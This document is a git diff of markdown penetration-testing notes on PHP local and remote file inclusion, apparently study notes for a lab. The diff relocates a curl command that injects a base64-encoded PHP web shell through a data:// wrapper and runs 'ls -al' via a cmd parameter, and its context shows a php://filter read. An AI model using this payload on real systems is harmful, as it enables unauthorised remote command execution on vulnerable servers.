@@ -17,6 +17,11 @@ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.bas
 
 <img width="1264" height="124" alt="image" src="https://github.com/user-attachments/assets/ef4e8a39-1fc0-4cac-af8f-7d25c10f18ab" />
 
+```
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%09-al'
+
+```
+
 # RFI 
 
 Test it first
@@ -29,11 +34,9 @@ Exploitation
 
 <img width="1110" height="151" alt="image" src="https://github.com/user-attachments/assets/1c7fd937-d460-4f90-abbc-e5fe8fac5459" />
 
+<img width="1279" height="312" alt="image" src="https://github.com/user-attachments/assets/c263cb2c-5071-4922-9742-be63bc0c4ca1" />
 
 
-```
-curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%09-al'
 
-```
 
 
